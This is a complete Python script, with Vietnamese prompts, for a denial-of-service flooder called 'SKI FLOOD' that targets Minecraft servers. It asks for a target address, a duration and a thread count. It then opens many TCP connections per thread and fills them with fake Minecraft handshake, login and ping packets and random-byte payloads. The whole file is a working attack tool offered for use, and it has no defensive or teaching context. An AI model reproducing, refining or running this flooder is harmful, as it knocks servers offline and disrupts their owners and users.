import os
import subprocess
import sys
import importlib
import socket
import threading
import time
import random
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

required_modules = ['requests', 'colorama']

def check_and_install_module(module_name):
    try:
        importlib.import_module(module_name)
        return True
    except ImportError:
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', module_name],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except:
            return False

if not all(check_and_install_module(m) for m in required_modules):
    print(f"{Fore.RED}[!] Thiếu module bắt buộc. Thoát.")
    sys.exit(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

BANNER = f"""
{Fore.RED}███████╗██╗     ██╗ ██████╗ ██╗  ██╗██████╗ 
██╔════╝██║     ██║██╔═══██╗██║ ██╔╝██╔══██╗
███████╗██║     ██║██║   ██║█████╔╝ ██████╔╝
╚════██║██║     ██║██║   ██║██╔═██╗ ██╔══██╗
███████║███████╗██║╚██████╔╝██║  ██╗██████╔╝
╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
{Style.RESET_ALL}               SKI FLOOD - Enhanced 2025
"""

def get_server_ip_port(server_address):
    try:
        if ':' in server_address:
            host, port = server_address.rsplit(':', 1)
            return socket.gethostbyname(host), int(port)
        
        import requests
        res = requests.get(f'https://api.mcsrvstat.us/2/{server_address}', timeout=4).json()
        if res.get('online'):
            return res.get('ip'), int(res.get('port', 25565))
        else:
            return socket.gethostbyname(server_address), 25565
    except:
        try:
            return socket.gethostbyname(server_address), 25565
        except:
            return None, None

# Một số payload Minecraft giả lập (phiên bản 1.8–1.21)
MINECRAFT_HANDSHAKE = lambda host, port: (
    b'\x0F' + b'\x00' + b'\x09' + host.encode('utf-8') +
    port.to_bytes(2, 'big') + b'\x01' + b'\x00'
)

MINECRAFT_LOGIN = b'\x00\x00\x00\x00\x08Player' + random.randbytes(12)

MINECRAFT_PING = b'\x00\x01'

def random_payload():
    payloads = [
        b'\x00' * random.randint(500, 4096),
        MINECRAFT_HANDSHAKE("localhost", 25565) + random.randbytes(random.randint(16, 128)),
        MINECRAFT_LOGIN + random.randbytes(32),
        b'\xfe\x01' + random.randbytes(512),           # legacy ping
        MINECRAFT_PING * random.randint(1, 5),
    ]
    return random.choice(payloads)

def flood_worker(server_ip, server_port, duration, thread_id, stop_event):
    connections = []
    sent = 0
    start_time = time.time()

    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            # Mở mới hoặc tái sử dụng
            if len(connections) < random.randint(8, 35):  # mỗi thread giữ 8–35 kết nối
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.2)
                s.connect((server_ip, server_port))
                connections.append(s)

            # Gửi random payload
            if connections:
                conn = random.choice(connections)
                payload = random_payload()
                try:
                    conn.sendall(payload)
                    sent += 1
                    if sent % 50 == 0:
                        now = datetime.now().strftime('%H:%M:%S')
                        print(f"{Fore.CYAN}[{now}] T{thread_id} | sent {sent:,} pkts{Style.RESET_ALL}")
                except:
                    connections.remove(conn)
                    conn.close()

        except Exception:
            time.sleep(0.03)  # tránh CPU 100% khi fail liên tục

    # Cleanup
    for s in connections:
        try:
            s.close()
        except:
            pass
    print(f"{Fore.YELLOW}[T{thread_id}] stopped • total ~{sent:,} packets{Style.RESET_ALL}")

def main():
    clear_screen()
    print(BANNER)

    target = input(f"{Fore.YELLOW}[>] Target (ip/domain hoặc ip:port): {Style.RESET_ALL}").strip()
    ip, port = get_server_ip_port(target)
    if not ip:
        print(f"{Fore.RED}Không resolve được địa chỉ.{Style.RESET_ALL}")
        return

    print(f"{Fore.GREEN}[+] Target → {ip}:{port}{Style.RESET_ALL}")

    try:
        duration = int(input(f"{Fore.YELLOW}[>] Thời gian (giây): {Style.RESET_ALL}"))
        threads_cnt = int(input(f"{Fore.YELLOW}[>] Số threads (20–500): {Style.RESET_ALL}"))
    except:
        print(f"{Fore.RED}Giá trị không hợp lệ.{Style.RESET_ALL}")
        return

    print(f"\n{Fore.GREEN}→ Bắt đầu flood {ip}:{port} trong {duration}s với {threads_cnt} threads...{Style.RESET_ALL}\n")

    stop_event = threading.Event()
    threads = []

    for i in range(threads_cnt):
        t = threading.Thread(
            target=flood_worker,
            args=(ip, port, duration, i+1, stop_event),
            daemon=True
        )
        t.start()
        threads.append(t)

    try:
        time.sleep(duration + 2)
        stop_event.set()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Ctrl+C → Dừng sớm...{Style.RESET_ALL}")
        stop_event.set()

    for t in threads:
        t.join(timeout=1.5)

    print(f"\n{Fore.GREEN}Hoàn tất. Đã cố gắng gửi hàng chục → hàng trăm nghìn packet mỗi giây.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
